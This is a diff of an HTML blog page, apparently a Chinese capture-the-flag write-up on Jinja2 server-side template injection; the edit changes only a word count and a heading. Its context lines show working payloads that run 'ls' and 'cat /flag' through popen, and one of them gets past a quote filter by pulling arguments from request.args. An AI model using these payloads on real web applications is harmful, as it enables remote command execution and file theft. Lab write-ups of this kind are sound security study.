@@ -419,7 +419,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    827
+                    825
                 </div>
                 
 
@@ -462,7 +462,7 @@
 <pre class="line-numbers language-none"><code class="language-none">{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>wrap_close的这个类,此类中有popen函数</p>
-<h2 id="web-363——过滤-39-、-quot"><a href="#web-363——过滤-39-、-quot" class="headerlink" title="web 363——过滤' 、&quot;"></a>web 363——过滤<code>'</code> 、<code>"</code></h2><p>过滤了单双引号：使用`request，从而避免单双引号的使用</p>
+<h2 id="web-363"><a href="#web-363" class="headerlink" title="web 363"></a>web 363</h2><p>过滤了单双引号：使用`request，从而避免单双引号的使用</p>
 <pre class="line-numbers language-none"><code class="language-none">?name={{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&amp;x1=__builtins__&amp;x2=__import__('os').popen('cat /flag').read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="web-364"><a href="#web-364" class="headerlink" title="web 364"></a>web 364</h2><p>过滤了单双引号、args</p>
